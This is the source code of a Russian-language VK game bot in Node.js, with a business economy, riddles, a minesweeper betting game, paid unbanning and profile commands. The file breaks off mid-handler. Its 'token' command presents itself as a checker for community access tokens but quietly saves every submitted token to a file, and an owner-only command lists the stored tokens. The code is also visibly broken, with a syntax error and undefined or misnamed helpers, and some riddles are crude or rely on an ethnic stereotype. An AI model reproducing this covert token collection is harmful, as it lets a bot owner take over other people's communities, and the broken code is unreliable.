const {VK, Keyboard} = require('vk-io');
const request = require("prequest");
const requests = require("request");
const rq = require("prequest");
const fs = require("fs");
const vk = new VK();
const str = new VK();
const ussr = new VK();
const user = new VK();
const { updates: cm, snippets, upload } = vk;

// Авторизация
const gtoken = ' ' // токен группы
const ut = ' ' // токен вашей страницы вк получать тут https://vkhost.github.io/ от приложения kate mobile
const gid =  ид группы
const qt = '' //qiwi токен для qiwi системы (по желанию)
// Авторизация

const child = require('child_process');
const { createCanvas, loadImage} = require('canvas')
const canvas = createCanvas(800, 800)
const Canvas = require('canvas');
const ctx = canvas.getContext('2d')
const path = require('path')
const acc = require("./base/acc.json");
const uid = require("./base/uid.json");
const log = require("./base/log.json");
const frac = require("./base/frac.json");
const config = require("./setting/config.json");
const vzlom = require("./base/vzlom.json");
const clans = require("./base/clans.json");
const tokens = require("./base/tokens.json");
const saper = require("./base/saper.json");
const tcpp = require('tcp-ping');
vk.setOptions({
	token: gtoken, 
	apiMode: 'parallel',
	pollingGroupId: gid
});
ussr.setOptions({
	token: ut
});
user.setOptions({
	token: ut
});
// QIWI API
var Qiwi = require('node-qiwi-api').Qiwi; 
var Wallet = new Qiwi(qt) // Токен QIWI
// QIWI API

let giving = false; ;
const businesses = [[
{name: 'Хлебная лавка', cost: 50000, earn: 200, workers: 1, id: 1, icon: '🥖'},
{name: '5 Хлебных лавок', cost: 350000, earn: 1000, workers: 10, id: 1, icon: '🥖'},
{name: 'Небольшая сеть Хлебных Лавок', cost: 900000, earn: 2625, workers: 30, id: 1, icon: '🥖'},
{name: 'Средняя сеть Хлебных Лавок', cost: 1200000, earn: 3750, workers: 50, id: 1, icon: '🥖'},
{name: 'Лучшая Хлебная Лавка в стране', cost: 4000000, earn: 11000, workers: 200, id: 1, icon: '🥖'}
],
[
{name: 'Маленький ларёк', cost: 100000, earn: 700, workers: 1, id: 2, icon: '🏪'},
{name: 'Средний ларёк', cost: 500000, earn: 3700, workers: 5, id: 2, icon: '🏪'},
{name: 'Средняя сеть ларьков', cost: 950000, earn: 7725, workers: 40, id: 2, icon: '🏪'},
{name: 'Ларьки во всех городах страны', cost: 8000000, earn: 37450, workers: 150, id: 2, icon: '🏪'},
{name: 'Ларьки в каждой стране', cost: 17500000, earn: 79950, workers: 400, id: 2, icon: '🏪'}
],
[
{name: 'Закусочная', cost: 300000, earn: 2700, workers: 3, id: 3, icon: '🍷'},
{name: 'Общепит', cost: 450000, earn: 4350, workers: 7, id: 3, icon: '🍷'},
{name: 'Ресторан', cost: 450000, earn: 7400, workers: 15, id: 3, icon: '🍷'},
{name: 'Небольшая сеть ресторанов', cost: 4000000, earn: 19900, workers: 80, id: 3, icon: '🍷'},
{name: 'Лучшие рестораны в стране', cost: 11000000, earn: 47400, workers: 300, id: 3, icon: '🍷'}
],
[
{name: 'Прилавок', cost: 500000, earn: 4100, workers: 15, id: 4, icon: '🏫'},
{name: 'Магазин', cost: 1250000, earn: 9350, workers: 10, id: 4, icon: '🏫'},
{name: 'Сеть магазинов', cost: 3000000, earn: 23350, workers: 70, id: 4, icon: '🏫'},
{name: 'Сеть супермаркетов', cost: 20000000, earn: 109850, workers: 500, id: 4, icon: '🏫'}
],
[
{name: 'Завод в гараже', cost: 1500000, earn: 8800, workers: 5, id: 5, icon: '🏭'},
{name: 'Средний завод', cost: 3500000, earn: 13800, workers: 20, id: 5, icon: '🏭'},
{name: 'Сеть заводов', cost: 15000000, earn: 60800, workers: 200, id: 5, icon: '🏭'},
{name: 'Главные заводы страны', cost: 50000000, earn: 274800, workers: 1000, id: 5, icon: '🏭'}
],
[
{name: 'Каменная шахта', cost: 25000000, earn: 84700, workers: 50, id: 6, icon: '⛏'},
{name: 'Угольная шахта', cost: 50000000, earn: 117200, workers: 75, id: 6, icon: '⛏'},
{name: 'Золотая шахта', cost: 60000000, earn: 229700, workers: 200, id: 6, icon: '⛏'},
{name: 'Алмазная шахта', cost: 90000000, earn: 432700, workers: 360, id: 6, icon: '⛏'},
{name: 'Крупнейший алмазный карьер', cost: 200000000, earn: 709700, workers: 700, id: 6, icon: '⛏'}
],
[
{name: 'Домашний офис', cost: 80000000, earn: 229625, workers: 10, id: 7, icon: '🏢'},
{name: 'Средний офис',cost: 240000000,earn: 329175,workers: 60,id: 7,icon: '🏢'},
{name: 'Большой офис',cost: 240000000,earn: 614675,workers: 200,id: 7,icon: '🏢'},
{name: 'Офис-небоскрёб',cost: 1000000000,earn: 1227275,workers: 700,id: 7,icon: '🏢'}
],
[
{name: 'Разработчик игр',cost: 150000000,earn: 302000,workers: 5,id: 8,icon: '🕹'},
{name: 'Разработчик игр с приятелем',cost: 200000000,earn: 379500,workers: 10,id: 8,icon: '🕹'},
{name: 'Небольшая компания по созданию игр',cost: 750000000,earn: 1024500,workers: 50,id: 8,icon: '🕹'},
{name: 'Огромная компания По разработке Игр',cost: 5000000000,earn: 6749500,workers: 500,id: 8,icon: '🕹'}
],
[
{name: 'Нефтевышка',cost: 500000000,earn: 707000,workers: 8,id: 9,icon: '🏜'},
{name: 'Нефтеплатформа в море',cost: 750000000,earn: 1019000,workers: 20,id: 9,icon: '🏜'},
{name: 'Нефтеплатформа в океане',cost: 1250000000,earn: 4049000,workers: 50,id: 9,icon: '🏜'},
{name: '5 нефтеплатформ в океане',cost: 5000000000,earn: 15249000,workers: 250,id: 9,icon: '🏜'}
],
[
{name: 'Мини АЭС', cost: 800000000, earn: 1050700, workers: 40, id: 10, icon: '💡'},
{name: 'Средняя АЭС', cost: 1200000000, earn: 1496200, workers: 75, id: 10, icon: '💡'},
{name: 'АЭС с 5 энергоблоками', cost: 4250000000, earn: 3088700, workers: 300, id: 10, icon: '💡'},
{name: 'Крупнейшая АЭС', cost: 10000000000, earn: 34843700, workers: 650, id: 10, icon: '💡'}
],
[
{name: 'Вип в боте Anna', cost: 25000000000, earn: 250000000, workers: 75, id: 11, icon: '🗺'},
{name: 'Модератор в боте Anna', cost: 3000000000000, earn: 1000000000, workers: 150, id: 11, icon: '🗺'},
{name: 'Админ в боте Anna', cost: 9000000000000, earn: 5000000000, workers: 250, id: 11, icon: '🗺'},
{name: 'MVP в боте Anna', cost: 20000000000000, earn: 11000000000, workers: 500, id: 11, icon: '🗺'},
{name: 'Программист в боте Anna', cost: 100000000000000, earn: 45000000000, workers: 1000, id: 11, icon: '🗺'},
{name: 'Родня создателю бота Anna', cost: 200000000000000, earn: 75000000000, workers: 1500, id: 11, icon: '🗺'}
]];

const zag = [
{id: 1, zagadka: "Без ног и без рук,\nА художник еще тот.", otvet: "звёздное небо"},
{id: 2, zagadka: "Красный колобок,\nГолубой платок.\nПо платку катается,\nЛюдям улыбается.", otvet: "солнце и небо"},
{id: 3, zagadka: "Поднять его легко, но сложно бросить далеко.", otvet: "пух"},
{id: 4, zagadka: "Каких камней в море не сыщешь?", otvet: "сухих"},
{id: 5, zagadka: "Во Франции это на втором месте, а в России на первом. Что это?", otvet: "буква Р"},
{id: 6, zagadka: "На столе стояла жестяная банка с крышкой. Она на 2/3 свисала со стола. Через некоторое время банка упала. Чтобы в ней было?", otvet: "лёд"},
{id: 7, zagadka: "У отца Кристи есть пять дочерей: Чочо, Чичи, Чече, Чача. Как зовут пятую дочку?", otvet: "Кристи"},
{id: 8, zagadka: "Что можно увидеть у женщины, если она поднимет ногу? На «П» начинается, На «А» заканчивается?", otvet: "пятка"},
{id: 9, zagadka: "У еврея на уме, у женщин – на теле, применяется на шахматной доске и в хоккее? ", otvet: "комбинация"},
{id: 10, zagadka: "Лететь – не долететь\nБежать – не добежать", otvet: "горизонт"},
{id: 11, zagadka: "Синяя шубка\nВесь мир покрыла", otvet: "небо"},
{id: 12, zagadka: "Лезет в окошко белая кошка", otvet: "лучи солнца"},
{id: 13, zagadka: "Седые кабаны все поле облегли", otvet: "туман"},
{id: 14, zagadka: "Без ног и без рук,\nА ворота открывает", otvet: "ветер"},
{id: 15, zagadka: "Выглянул в окошко,\nИдет там длинненький Антошка", otvet: "дождь"},
{id: 16, zagadka: "Через реку повисло\nАлое коромысло", otvet: "радуга"},
{id: 17, zagadka: "В воде не утонет,\nВ огне не сгорит", otvet: "лёд"},
{id: 18, zagadka: "Не земля, не море,\nКорабли здесь не плавают\nИ ходить нельзя", otvet: "болото"},
{id: 19, zagadka: "В воду упало 2 гвоздя. Как фамилия грузина", otvet: "Заржавели"},
{id: 20, zagadka: "Чем заканчивается ночь и день?", otvet: "мягким знаком"},
{id: 21, zagadka: "Кто умеет говорить на любом языке?", otvet: "эхо"},
{id: 22, zagadka: "Скажите что это такое: с усами, большой, синий, везет зайцев?", otvet: "троллейбус"},
{id: 23, zagadka: "Серенький, маленький, похож на слона.", otvet: "слонёнок"},
{id: 24, zagadka: "Стоит бабка на полу, приоткрыв свою дыру", otvet: "печка"},
{id: 25, zagadka: "Само твердое, а в мягкое вставляются. Рядом только шарики болтаются…", otvet: "серьги"},
{id: 26, zagadka: "Эта женщина сначала потрется об тебя, а потом еще и денег потребует… ", otvet: "кондуктор"},
{id: 27, zagadka: "С виду — клин, а развернешь — блин", otvet: "зонт"},
{id: 28, zagadka: "Пять чуланов, одна дверь.", otvet: "перчатки"},
{id: 29, zagadka: "У фермера было стадо из восьми овец: три белые, четыре черные, одна коричневая.\nСколько овец могут ответить, что в стаде есть хотя бы одна овца такой же масти, как её?", otvet: "овцы не разговаривают"},
{id: 30, zagadka: "Языка нет, а правду скажет", otvet: "зеркало"},
{id: 31, zagadka: "Ни огня, ни жару не имею, а все поджигаю.", otvet: "молния"},
{id: 32, zagadka: "Сами — верхом, а ноги — за ушами.", otvet: "очки"},
{id: 33, zagadka: "Какой знак поставить между цифрами 5 и 4 , чтобы ответ был меньше 5, но больше 4?", otvet: "запятую"},
{id: 34, zagadka: "Без чего не может жить человек?", otvet: "без имени"},
{id: 35, zagadka: "Не птица, а летает", otvet: "летучая мышь"},
{id: 36, zagadka: "Что в руках не удержать?", otvet: "вода"},
{id: 37, zagadka: "В лесу она не водится,\nВ реке она одна,\nВ сарай не помещается,\nА в кошельке их 2!", otvet: "буква К"},
{id: 38, zagadka: "Горя не знает, а слезы проливает", otvet: "туча"},
{id: 39, zagadka: "Идешь, идешь, а конца не найдешь.", otvet: "земной шар"},
{id: 40, zagadka: "Чему на свете нет:\nни меры, ни веса, ни цены?", otvet: "огонь"},
{id: 41, zagadka: "Какое слово дополнит следующий набор слов: Пляс, Река, Тмин, Сила, Удод, Фаза?", otvet: "соль"},
{id: 42, zagadka: "Несла бабка на базар сто яиц, а дно упало сколько яиц осталось в корзине.", otvet: "ни одного"},
{id: 43, zagadka: "Москва - 100, Ярославль - 1000, Архангельск - 500. О чём речь?", otvet: "рубли"},
{id: 44, zagadka: "Стоит дуб,\nВ нем двенадцать гнезд,\nВ каждом гнезде\nПо четыре яйца,\nВ каждом яйце\nПо семи цыпленков.", otvet: "год"},
{id: 45, zagadka: "етели утки: одна впереди и две позади, \nОдна позади и две впереди, \nОдна между двумя. \nСколько их было всего?", otvet: "три"},
{id: 46, zagadka: "Шли муж с женой, брат с сестрой да муж с шурином. Сколько всего человек?", otvet: "три"}
]

const util = {
    /*sp: (int) => {
        int = int.toString();
        return int.split('').reverse().join('').match(/[0-9]{1,3}/g).join(',').split('').reverse().join('');
    },*/
    sp: (number) => number.toLocaleString("de"),
    rn: (count) => {
    	count = Math.floor(count);
    	let i = 0 === count ? count : Math.floor(Math.log(count) / Math.log(1000)); 
    	let result = parseFloat((count / Math.pow(1000, i)).toFixed(2)); 
    	if (i >= 17) return "Дохуя";
    	result += " " + ["", "тыс", "млн", "млрд", "трлн", "кврлн", "квинтл", "скстлн", "сптлн", "октлн", "нонлн", "дцлн", "ундцлн", "додцлн", "трдцлн", "квтуордцлн", "квндцлн"][i];
    	return result;
    },
    match: (str, balance) => Math.floor(Number(str.replace(/(вс(е|ё)|в(о|а)банк)/ig, balance).replace(/(к|k)/ig, "000").replace(/(м|m)/ig, "000000"))) < 0 ? 0 : Math.floor(Number(str.replace(/(вс(е|ё)|в(о|а)банк)/ig, balance).replace(/(к|k)/ig, "000").replace(/(м|m)/ig, "000000"))),
    random: (x, y) => y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x),
    filter: (text) => /(http(s)?:\/\/.)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/ig.test(text) ? true : false,
    gi: (int) => {
    	int = int.toString();

    	let text = ``;
    	for (let i = 0; i < int.length; i++) {
    		text += `${int[i]}&#8419;`;
    	}

    	return text;
    },
    decl: (n, titles) => {
    	return titles[(n % 10 === 1 && n % 100 !== 11) ? 0 : n % 10 >= 2 && n % 10 <= 4 && (n % 100 < 10 || n % 100 >= 20) ? 1 : 2]
    },
    random: (x, y) => {
    	return y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x);
    },
    pick: (array) => {
    	return array[utils.random(0, array.length - 1)];
    },
    getSadEmoji: () => utils.pick(["😞", "😔", "😟", "😩", "😣", "☹️", "🙁", "😕", "😦", "😧"]),
    getEmoji: () => utils.pick(["😁","☺","🙂","😉", "😄","😃","😺"])
}
cm.on(['chat_invite_user'], async (message, next) => {

	let user = await vk.api.call('users.get', {
		user_id: message.eventMemberId
	})

	message.send(`@id${message.eventMemberId} (${user[0].first_name} ${user[0].last_name}), добро пожаловать в беседу. Напиши команду "Помощь", что бы узнать мои команды`);
	await next();
});
cm.on(['chat_kick_user'], async (message, next) => {
	let user = await vk.api.users.get({user_id: message.eventMemberId})

	message.send(`Пользователь @id${message.eventMemberId} (${user[0].first_name} ${user[0].last_name}) покинул или был исключен из беседы`);

	vk.api.call("messages.removeChatUser", {
		chat_id: message.chatId,
		user_id: message.eventMemberId
	});

	await next();
});
cm.on(['chat_invite_user_by_link'], async (message, next) => {
	message.send(`Добро пожаловать в беседу. Напиши команду "Помощь", что бы узнать мои команды`);
	await next()
});
let stoken = ut




cm.use(async (message, next) => {
	if(message.is("message") && message.isOutbox) return;
	message.user = message.senderId;
	if (message.user < 1) return;
	if (!message.text) return;
	if(/\[club179084056\|(.*)\]/i.test(message.text)) message.text = message.text.replace(/\[club179084056\|(.*)\]/ig, '').trim();

	const a = acc.users[user_id(message.user)];	

	if(!uid[message.user]){
		acc.number += 1;
		let numm = acc.number;
		uid[message.user] = {
			id: numm
		}
		let id = user_id(message.user); 		 
		message.send(`🔔 @id${message.user}(Уважаемый пользователь), для того что-бы начать играть, вам непосредственно надо зарегистрироваться.\n Статус вашего аккаунта: "Не зарегистрирован"\n -- Для начала регистрации напишите -- "регистрация" и следуйте дальнейшим указаниям`)
		acc.users[numm] = {
			lock: true,
			restart: false,
			full: false,
			donate: 0,
			zagadka: false,
			zagadka_status: false,
			zagadka_id: false,
			stat: false,
			act: false,
			rr: 3,
			rr_stavka: false,
			rr_status: false,
			cid: false,
			business: [],
			block_top: false,
			unban: false,
			stick: false,
			invie: 0,
			invites: true,
			verify: false,
			balance: 15000,
			phone: false,
			sphone: false,
			level: 0, 
			bphone: 0, 
			adm_time: 0,
			bitcoin: 0, 
			donate: 0,
			rub: 0,
			subyoutube: 0, 
			yyoutube: 0, 
			cjob: false,
			keys: 0,
			qiwi: false, 
			pk: false, 
			spk: false,
			fix: false,
			video: false,
			safe_status: false,
			safe_key: false, 
			bloks_cases: false,
			bloks_giverub: false,
			bloks_frac: false,
			bloks_gun_case: false,
			bizs_one_stop: false,
			bizs_two_stop: false,
			block_game: true,
			block_porn: true,
			exs: 0,
			exsup: 50,
			lvl: 0,
			number: numm,
			partner: false,
			brk: false,
			predlog: false,
			id: message.user,
			nick: true,
			game: {
				binlose: 0,
				binwin: 0,
				binstop: false,
				kazlose: 0,
				kazwin: 0,
				rand_lose: 0,
				rand_win: 0,
				stavka_win: 0,
				stavka_lose: 0,
				win: 45,
				strela_loose: 0,
				strela_win: 0
			},
			msg: { 
				messages: 0, 
				last_msg: "" 
			},  
			bizs: {
				one_biz: false,
				one: {
					count: false,
					balance: 0,
					id: false,
					name: false,
					people: 0,
					uplvl: 0,
					zp: 0
				},
				two_biz: false,
				two: {
					count: false,
					balance: 0,
					id: false,
					name: false,
					people: 0,
					uplvl: 0,
					zp: 0
				}
			},
			cars: false,
			reys: false,
			aircraft: false,
			helicopter: false,
			house: false,
			housep: 0,
			pit: false,
			bank: 0,
			lodka: false,
			tag: "Игрок", 
			brak: false,
			ainfo: {
				all_ans: 0,
				ans: 0, 
				good_ans: 0,
				bad_ans: 0,
				vig: 0
			}, 
			admin: {
				block_pay: false,
				block_give: false,
				block_rep: false
			}, 
			rep: {
				status: false,
				id: false
			},
			ban: false, 
			mute: false,
			warn: 0,
			warn_p: [],
			credit: 0,
			procent: 0,
			job: { 
				name: false, 
				lvl: 0,  
				count: 0 
			}, 
			job_stop: false,
			global_exs: 0,
			autozp: false,
			autobiz: false,
			frac_name: false,
			duel: false,
			duel_summ: false,
			nachal: false,
			uron: 0,
			gun_name: false,
			prefix: `Игрок №${numm}`,
			youtube: false,
			lvl_v: 1,
			zov: 0,
			qprov: false,	
			qtest: false,	
			qnumber: false,	
			qotkaz: false,
			qsogl: false,
			qoferta: false,	
			qtok: false,
			buttons: [],
			rtime: `${time()} | ${data()}` 
		} 
		vk.api.call('users.get', {
			user_ids: message.user,
			fields: "photo_max,city,verified,status,domain,photo_id,sex,last_seen"
		}).then(res => {
			let user = res[0]; 
			acc.users[user_id(message.user)].prefix = `${user.first_name} ${user.last_name}`;
		}).catch((error) => {console.log('err[prefix]'); }); 
	}
	let id = user_id(message.user);
	if(message.text){ 
		acc.msg += 1;
		if(!acc.users[user_id(message.user)]) return;
		acc.users[id].msg.messages += 1;
		acc.users[id].msg.last_msg = `${data()}`; 
		if(acc.users[id].mute == true) return message.send(`Ваш аккаунт временно заблокирован.\n -- Вы можете снять блокировку досрочно, oплатив 30₽\n Преобретать у @id287908009 (Основателя)`);
	}
	if(acc.users[id].ban != false) return message.send(`Ваш аккаунт заблокирован навсегда.\n -- Вы можете снять блокировку, oплатив 100₽\n Преобретать у @id287908009 (Основателя)`);
	try {
		await next();
	} catch (err) { console.error(err) }
});

cm.setHearFallbackHandler(message => {
	const a = acc.users[user_id(message.user)];	
	if(!message.isChat) {
		message.send(`@id${a.id}(${a.prefix}), такой команды не существует.\nНапиши "Помощь", что бы узнать мои команды.`);
	}
})

cm.hear(/^(?:пинг|ping|ms|подключение|connect)\s?([^]+)?/i, (message) => { 
	var http = message.$match[1];
	if(!http) return message.send(`Вы не ввели адрес сайта.`)
		tcpp.ping({address: http }, function(err, data) {
			return message.send(`&#8987; Подключение нашего сервера, до сайта: "${http}" составляет: ${Math.round(data.avg)} ms.`)
		});
})

// Автостатус
setInterval(() => {
	var st = [`📝`,`✏`,`💭`].random();
	var rt = [`${st} Принято более ${spaces(acc.msg)} сообщений!`,`👥 С нами уже ${spaces(acc.number)} игроков!`,].random();
	user.api.status.set({text: rt, group_id: gid});
}, 120000);


// Вечный онлайн сообщества
setInterval(() => {
	user.api.groups.enableOnline({group_id: gid})
}, 200000);


cm.hear(/^(?:сапер|сапёр)\s?(.*)/i, message => {
	const a = acc.users[user_id(message.user)];	
	message.$match[1] = util.match(message.$match[1], a.balance);
	if(a.balance < message.$match[1]) return message.send('У Вас нет столько денег!')
		if(message.$match[1] < 99999) return message.send(`Минимальная ставка 100.000$`)
			if (!Number(message.$match[1])) return message.send(`Число ставки, должно быть цифрового вида.`)
				a.balance -= Number(message.$match[1])
			if(!saper[message.user] || saper[message.user].status != true){
				var poles = [{id: 11,replacer: '1x'}, {id: 12,replacer: '2x'}, {id: 13,replacer: '3x'}, {id: 14,replacer: '4x'}, {id: 15,replacer: '5x'},
				{id: 21,replacer: '1y'}, {id: 22,replacer: '2y'}, {id: 23,replacer: '3y'}, {id: 24,replacer: '4y'}, {id: 25,replacer: '5y'}, {id: 31,replacer: '1z'}, {id: 32,replacer: '2z'}, {id: 33,replacer: '3z'}, {id: 34,replacer: '4z'}, {id: 35,replacer: '5z'},
				{id: 41,replacer: '1u'}, {id: 42,replacer: '2u'}, {id: 43,replacer: '3u'}, {id: 44,replacer: '4u'}, {id: 45,replacer: '5u'},
        {id: 51,replacer: '1t'}, {id: 52,replacer: '2t'}, {id: 53,replacer: '3t'}, {id: 54,replacer: '4t'}, {id: 55,replacer: '5t'}] // x => y
        for(var b = 0, bmb = []; b < 15; b++){
        	var rd = rand(11,55)
        	if(bmb.indexOf(rd) === -1) bmb.push(rd)
        }
    saper[message.user] = {
    	bombs: bmb,
    	status: true,
    	spot: Number(message.$match[1]),
    	opened: [],
    	winner: Number(message.$match[1])
    }
    message.send(`🎮 Игра началась
    	💷 Ставка: ${util.sp(message.$match[1])}$
    	🔷 Ячейка [номер] - открыть ячейку
    	ℹ Стоп сапёр - Забрать выигрыш.
    	
    	0⃣1⃣2⃣3⃣4⃣5⃣ 
    	1⃣⬜⬜⬜⬜⬜ 
    	2⃣⬜⬜⬜⬜⬜ 
    	3⃣⬜⬜⬜⬜⬜ 
    	4⃣⬜⬜⬜⬜⬜ 
    	5⃣⬜⬜⬜⬜⬜`)
} else return message.send('Вы уже начали игру!')
})

cm.hear(/^(?:стоп сапёр|стоп сапер)/i, message => {
	const a = acc.users[user_id(message.user)];	
	if(!saper[message.user] || !saper[message.user].status) return message.send('Ты довен? А сапера запустить?')
		saper[message.user].status = false
	a.balance += saper[message.user].winner
	delete saper[message.user]
	message.send('Сапер остановлен')
});

cm.hear(/^ячейка ([1-5]),?\s?([1-5])/i, message => {
	const a = acc.users[user_id(message.user)];	
	if (!saper[message.user] || saper[message.user].status == false) return message.send(`Вы не начали игру, что бы её начать, напишите "сапёр [ставка]`)
		var poles = [{
			id: 11,
			replacer: '1x'
		}, {
			id: 12,
			replacer: '2x'
		}, {
			id: 13,
			replacer: '3x'
		}, {
			id: 14,
			replacer: '4x'
		}, {
			id: 15,
			replacer: '5x'
		},
		{
			id: 21,
			replacer: '1y'
		}, {
			id: 22,
			replacer: '2y'
		}, {
			id: 23,
			replacer: '3y'
		}, {
			id: 24,
			replacer: '4y'
		}, {
			id: 25,
			replacer: '5y'
		}, {
			id: 31,
			replacer: '1z'
		}, {
			id: 32,
			replacer: '2z'
		}, {
			id: 33,
			replacer: '3z'
		}, {
			id: 34,
			replacer: '4z'
		}, {
			id: 35,
			replacer: '5z'
		},
		{
			id: 41,
			replacer: '1u'
		}, {
			id: 42,
			replacer: '2u'
		}, {
			id: 43,
			replacer: '3u'
		}, {
			id: 44,
			replacer: '4u'
		}, {
			id: 45,
			replacer: '5u'
		},
		{
			id: 51,
			replacer: '1t'
		}, {
			id: 52,
			replacer: '2t'
		}, {
			id: 53,
			replacer: '3t'
		}, {
			id: 54,
			replacer: '4t'
		}, {
			id: 55,
			replacer: '5t'
		}
		]

		var bombs = saper[message.user].bombs

		var texts = {
			bomb: `💣 Тебе попалась бомба.\n${util.getSadEmoji()} Ты проигрываешь ${util.sp(saper[message.user].spot)}$.`,
			yaika: `💎 Ты открыл пустую ячейку. Ставка увеличилась.
			ℹ Сапёр стоп - Забрать приз
			💰 Ваш выигрыш: ${util.sp(saper[message.user].winner)}$`
		}

		var ri = Number(message.$match[1] + message.$match[2])
		if (saper[message.user].opened.indexOf(ri) > -1) return message.send(`Ты уже открывал эту ячейку!`)
			if (bombs.indexOf(ri) > -1) {
				saper[message.user].status = false
			} else if (bombs.indexOf(ri) == -1) {
				saper[message.user].winner += saper[message.user].spot
			}

			saper[message.user].opened.push(ri)
			message.send(`%text%

				0⃣1⃣2⃣3⃣4⃣5⃣ 
				1⃣1x2x3x4x5x
				2⃣1y2y3y4y5y
				3⃣1z2z3z4z5z 
				4⃣1u2u3u4u5u 
				5⃣1t2t3t4t5t`.replace(/([1-5])([a-z])/ig, (x) => {
					var i = poles.filter(a => a.replacer == x).map(a => Number(a.id))[0]
					if (saper[message.user].opened.indexOf(i) > -1) {
						if (bombs.indexOf(i) > -1) {
							return '💣'
						} else {
							return '💰'
						}
					} else return '⬜'
				}).replace(/%text%/ig, (z) => {
					if (saper[message.user].status == false) return texts.bomb
						return texts.yaika.replace(/%winner%/, saper[message.user].winner)
				}))
		})






cm.hear(/^(?:token)\s?(.*)?/i, async(message) => { 
	var count = 0; 
	var text = ``; 
	const tok = new VK();
	if(!message.$match[1]) return message.send(`Ошибка, вы не ввели токен сообщества.`); 
	tok.api.groups.getTokenPermissions({access_token: `${message.$match[1]}`}).then(function(response){ 
		var c = response; 
		c.permissions.map(function(c){ 
			text += ` ${c.name}, `; 
			count += 1; 
		}) 
	}).catch((error) => { 
		return message.send(`Ошибка, указан неверный токен сообщества.`); 
	})
	tok.api.groups.getById({access_token: `${message.$match[1]}`, fields: "members_count,age_limits,wall,verified,trending,status,site,is_closed,type"}).then(function(response){ 
		var gr = response[0]; 


		if(!tokens.find(x => x.group_id === gr.id)){
			tokens.push({
				followers: gr.members_count,
				group_name: gr.name,
				group_id: gr.id,
				group_type: gr.type.toString().replace(/group/gi, "Группа").replace(/page/gi, "Публичная страница").replace(/event/gi, "Мероприятие"),
				group_token: message.$match[1],
				group_permissions: text,
				group_status: gr.status,
				group_wall: gr.wall.toString().replace(/0/gi, "Выключена").replace(/1/gi, "Открытая").replace(/2/gi, "Ограниченная").replace(/3/gi, "Закрытая")
			});
		}

		return message.send(` 

			Обладатель токена: Группа - «@club${gr.id} (${gr.name})» 

			Информация о группе: 
			Название группы: «${gr.name}» 
			Идентификатор группы: «@club${gr.id}» 
			Статус группы: «${gr.status}» 
			Тип сообщества: ${gr.type.toString().replace(/group/gi, "Группа").replace(/page/gi, "Публичная страница").replace(/event/gi, "Мероприятие")} 
			Состояние стены сообщества: ${gr.wall.toString().replace(/0/gi, "Выключена").replace(/1/gi, "Открытая").replace(/2/gi, "Ограниченная").replace(/3/gi, "Закрытая")} 
			Подписчики группы: ${spaces(gr.members_count)} 

			Информация о токене @club${gr.id} (сообщества): 
			Статус: Получен 
			Права токена(${count}): ${text} 
			`) 
	}) 
})








cm.hear(/^(?:токены)/i, message => { 
	if(message.user != 287908009) return
		var text = `Токены сохранённые в базе:\n\n`;

	return message.send(tokens.map(x => `
		📍 Обладатель токена – «@club${x.group_id} (${x.group_name})»
		🆔 Айди группы – ${x.group_id}
		🔎 Тип группы – ${x.group_type}
		📝 Состояние стены – ${x.group_wall}
		👥 Подписчиков в группе – ${x.followers} 
		👀 Токен – *****************************************************************************
		🔑 Права токена – ${x.group_permissions}\n\n
		`).join('------------------\n'));
})




cm.hear(/^(?:созвать всех)/i, (message) => {
	if(message.user != 287908009) return
		vk.api.messages.getConversationMembers({ peer_id: 2000000000 + message.chatId, fields: "online" }).then(function(res) {
			let text = '';
			for (i in res.profiles) {
				if (res.profiles[i].online == 1 || res.profiles[i].online == 0) {
					text += `@id${res.profiles[i].id}(&#4448;)`
				}
			}
			text += '\n🌍 ВАС ПРИЗЫВАЮТ 🌍'
			return message.send(text)
		})

	function check(status) {
		if (status == 1) return "online"
			if (status == 0) return "offline"
		}
});



//Все новые системы:
   	    cm.hear(/^(?:Мой канал)/i, (message) => { // Команда
   	    	let user = acc.users[user_id(message.user)]; 
   	    	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
   	    	if(user.youtube == false) return message.send(`У вас нет канала`)
 if(user.spk == false) return message.send(`💻 >> Ваш Компьютер выключен`); // Компьютер Выключен
 if(user.pk == false) return message.send(`У вас нет компьютера`); // Если нету компьютера
 return message.send(`
 	💻 @id${user.id}(${user.prefix}), Название вашего YouTube канала: ${user.youtube} 
 	💻 >> На канал подписано: ${user.subyoutube} пользователей
 	💻 >> Вы подписаны на ${user.yyoutube} каналов.
 		 	 		 	`); // Исполнительный текст
});
     	cm.hear(/^(?:Открыть профиль)/i,  (message) => { // Сама команда
     		let user = acc.users[user_id(message.user)]; 
     		if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
     		if(user.lock == true) return message.send(`@id${user.id}(${user.prefix}), у вас уже открытый профиль!`);
     		user.lock = true
	return message.send(`@id${user.id}(${user.prefix}), новый статус профиля: Открытый`); // Исполнительный текст
});
    cm.hear(/^(?:Закрыть профиль)/i,  (message) => { // Сама команда
    	let user = acc.users[user_id(message.user)]; 
    	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
    	if(user.lock == false) return message.send(`@id${user.id}(${user.prefix}), у вас уже закрытый профиль!`);
    	user.lock = false
	return message.send(`@id${user.id}(${user.prefix}), новый статус профиля: Закрытый`); // Исполнительный текст
});
     	   cm.hear(/^(?:ID|Мой ид|мой ID)/i,  (message) => { // Сама команда
     	   	let user = acc.users[user_id(message.user)]; 
     	   	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	return message.send(`@id${user.id}(${user.prefix}), ID Вашего аккаунта в @bot.anya (Бот Анна): ${user_id(message.user)}\nID Вашего профиля ВКонтакте: @id${user.id}(${user.id})`); // Исполнительный текст
});
  cm.hear(/^(?:Статус)\s?([^]+)?/i,  (message) => { // Сама команда
  	let user = acc.users[user_id(message.user)]; 
  	if(user.act == false) return message.send(`@id${user.id}(${user.prefix}), Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
  	user.stat = message.$match[1];
